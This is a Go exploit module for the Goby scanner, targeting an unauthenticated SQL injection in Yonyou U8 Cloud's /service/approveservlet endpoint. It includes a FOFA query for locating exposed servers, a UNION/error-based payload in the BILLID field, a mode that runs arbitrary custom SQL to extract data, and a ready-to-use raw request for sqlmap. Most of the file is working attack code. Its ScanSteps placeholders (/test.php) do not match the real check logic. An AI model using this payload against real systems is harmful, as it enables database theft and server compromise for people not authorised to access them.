package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "U8 Cloud service/approveservlet SQL Injection Vulnerability",
    "Description": "<p>There is a SQL injection vulnerability in the U8 Cloud service/approveservlet interface of UFIDA. In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.</p>",
    "Product": "yonyou-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-11-01",
    "PostTime": "2024-11-05",
    "Author": "secure_insights@163.com",
    "FofaQuery": "body=\"请下载新版UClient\" && body=\"UClient\"",
    "GobyQuery": "body=\"请下载新版UClient\" && body=\"UClient\"",
    "Level": "1",
    "Impact": "<p>There is a SQL injection vulnerability in the U8 Cloud service/approveservlet interface of UFIDA. In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates: <a href=\"https://u8.yonyou.com/proandser/product/2\">https://u8.yonyou.com/proandser/product/2</a></p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143434350"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "example,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "example",
            "type": "select",
            "value": "db_name(),user,@@SERVERNAME",
            "show": "AttackType=example"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select @@SERVERNAME",
            "show": "AttackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.1",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud service/approveservlet SQL 注入漏洞",
            "Product": "用友-U8",
            "Description": "<p>用友U8 Cloud service/approveservlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://u8.yonyou.com/proandser/product/2\" target=\"_blank\">https://u8.yonyou.com/proandser/product/2</a><br></p>",
            "Impact": "<p>用友U8 Cloud service/approveservlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "U8 Cloud service/approveservlet SQL Injection Vulnerability",
            "Product": "yonyou-U8",
            "Description": "<p>There is a SQL injection vulnerability in the U8 Cloud service/approveservlet interface of UFIDA. In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates: <a href=\"https://u8.yonyou.com/proandser/product/2\" target=\"_blank\">https://u8.yonyou.com/proandser/product/2</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the U8 Cloud service/approveservlet interface of UFIDA. In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "9968"
}`

	sendPayload_e8CnlW := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		// POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.Data = `BILLID=1'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,convert(int,(` + sql + `)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20WPWZ&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud`
			PostRequest.FollowRedirect = false

			// 设置请求头
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}

			// 发送请求
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		url := `/service/approveservlet`

		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
			"Accept":       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Connection":   "close",
		}
		resp, err := setPostRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}

		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_e8CnlW
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "DB_NAME()"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "转换成数据类型") {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/service/approveservlet`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_e8CnlW
			attackType := goutils.B2S(stepLogs.Params["AttackType"])
			custom := goutils.B2S(stepLogs.Params["custom"])
			example := goutils.B2S(stepLogs.Params["example"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "custom":
				resp, err := sendPayload(expResult.HostInfo, custom)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`&apos;\s*(.*?)\s*&apos;`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult
			case "example":
				resp, err := sendPayload(expResult.HostInfo, example)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`&apos;\s*(.*?)\s*&apos;`)
				match := re.FindStringSubmatch(resp.Utf8Html)

				var sqlinformation string
				if len(match) > 1 {
					sqlinformation = match[1]
				}

				if len(sqlinformation) < 1 {
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}

				// 继续处理 sqlinformation

				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult

			case "sqlpoint":
				sql := ""
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /service/approveservlet HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
  
BILLID=1'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONVERT(int,db_name()),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20WPWZ&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
  `
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
